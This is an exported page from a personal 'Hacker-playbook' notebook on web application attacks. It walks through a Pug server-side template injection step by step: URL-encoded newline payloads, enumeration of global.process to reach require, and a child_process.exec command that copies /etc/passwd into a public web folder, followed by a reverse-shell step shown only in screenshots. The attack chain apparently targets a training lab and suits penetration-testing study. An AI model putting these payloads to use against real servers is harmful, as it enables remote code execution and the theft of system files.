<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Template Engine Attacks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>

<ol>
<li><a href="Hacker-playbook--Webapps-attack--recon-tools.html">recon-tools</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS.html">XSS</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XSS--classic_XSS.html">classic XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--HTML_entity_attacks_XSS.html">HTML entity attacks XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Polyglot_Attack.html">Polyglot Attack</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--xsshunter.html">xsshunter</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--DOM_XSS.html">DOM XSS</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS.html">Adv NodeJS XSS</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--escaped_string_interpolation.html">escaped string interpolation</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--unescaped_string_interpolation.html">unescaped string interpolation</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Escaped_String_Interpolation_into_dynamic_inline_Javascript.html">Escaped String Interpolation into dynamic inline Javascript</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Unescaped_buffered_code.html">Unescaped buffered code</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XSS--Adv_NodeJS_XSS--Escaped_String_Interpolation_into_escaped_dynamic_inline_Javascript.html">Escaped String Interpolation into escaped dynamic inline Javascript</a></li>
</ol>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--BeeF.html">BeeF</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection.html">NoSQL injection</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--classic_login_injection.html">classic login injection</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection.html">Advanced NOSQL injection</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection--password_injection.html">password injection</a></li>
<li><a href="Hacker-playbook--Webapps-attack--NoSQL_injection--Advanced_NOSQL_injection--get_users_and_passwords.html">get users and passwords</a></li>
</ol>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--Deserialization.html">Deserialization</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Template_Engine_Attacks.html">Template Engine Attacks</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Tplmap.html">Tplmap</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Template-RCE-upload.html">Template-RCE-upload</a></li>
<li><a href="Hacker-playbook--Webapps-attack--Server_Side_Request_Forgery.html">Server Side Request Forgery</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--Server_Side_Request_Forgery--chat.html">chat</a></li>
</ol>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE.html">XML-XXE</a></li>
<ol>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
<li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
</ol></ol></div>
<div class="page"><h1><b><u>Template Engine Attacks</u></b></h1><br /><br />First try a basic XSS on the direct message <br /><br /><img src="images/690-1.png" alt="images/690-1.png" /> <img src="images/690-2.png" alt="images/690-2.png" /><br /><br /><br />From Burp History :<br /><br />request :<br /><br /><img src="images/690-3.png" alt="images/690-3.png" /><br /><br />Server Reply :<br /><br /><img src="images/690-4.png" alt="images/690-4.png" /><br /><br /><br />Try to evaluate using simple arithmetic equation (using 9*9) and check if the request is interpreted or not. <br /><br /><br />It was NOT (dont get 81)<br /><br /><img src="images/690-5.png" alt="images/690-5.png" /><br /><br /><br />In that particular case, we need to use the Pug functionnality to break out the template using a new line (\n) and a sign = .<br /><strong><br />[new line]=9*9</strong><br /><br />They both need to be URL encoded :<br /><br />\n = %0a<br />= = %3d<br /><br />Sooooooooooooooo :<br /><br /><br /><img src="images/690-6.png" alt="images/690-6.png" /><br /><br /><br />We ve got 81 now !<br /><br />Go for a shell , using child.process.exec function.<br /><br />We need to find the which function are available trying to enumerate them (/must be url encoded ):<br /><br />We are looking for Require which is most probably linked to process and mainModule<strong><br /></strong><strong><h2><br />• Get the global Object -&gt; [new line]=global</h2></strong><br /><br />Plus %0a at start<br /><br /><img src="images/690-7.png" alt="images/690-7.png" /><br /><br /><img src="images/690-8.png" alt="images/690-8.png" /><br /><br /><strong><br /></strong><strong><h2>• Parsing the global object (using each iterator)</h2></strong><strong><span style="text-decoration:underline;">:</span></strong><br /><br />each val, index in global<br />  p=index<br />  <br />  <br />  <img src="images/690-9.png" alt="images/690-9.png" /><br /><br /><strong><span style="text-decoration:underline;"><br />Get the responce </span></strong><br /><br /><img src="images/690-10.png" alt="images/690-10.png" /><br /><br />• <strong><h2>Choose process :</h2></strong><br /><br />each val, index in global.process<br />  p=index<br /><br /><strong><span style="text-decoration:underline;">Get the responce :<br /></span></strong><br /><img src="images/690-11.png" alt="images/690-11.png" /><br /><br /><br /><strong><span style="text-decoration:underline;">Try to iterate using index in global.process.WHATEVER : </span></strong><br /><br />Found the require function :<br /><br /><img src="images/690-12.png" alt="images/690-12.png" /><br /><br /><br /><strong><span style="text-decoration:underline;">Got for RCE using the require field :</span></strong><br /><br />- var x = global.process.mainModule.require<br />- x('child_process').exec('cat /etc/passwd &gt;&gt; /opt/web/chatSupportSystems/public/accounts.txt')<br /><br /><br /><img src="images/690-13.png" alt="images/690-13.png" /><br /><br /><br />Inject it <br /><br /><br /><img src="images/690-14.png" alt="images/690-14.png" /><br /><br /><br /><br /><br /><strong><span style="text-decoration:underline;">get the result :</span></strong><br /><br /><br /><img src="images/690-15.png" alt="images/690-15.png" /><br /><br /><br /><strong><span style="text-decoration:underline;">get a revershe shell :<br /><br /></span></strong><br /><img src="images/690-16.png" alt="images/690-16.png" /><br /><br /><br /><img src="images/690-17.png" alt="images/690-17.png" /><br /><br /><br /><br /><br /></div></div>
</body></html>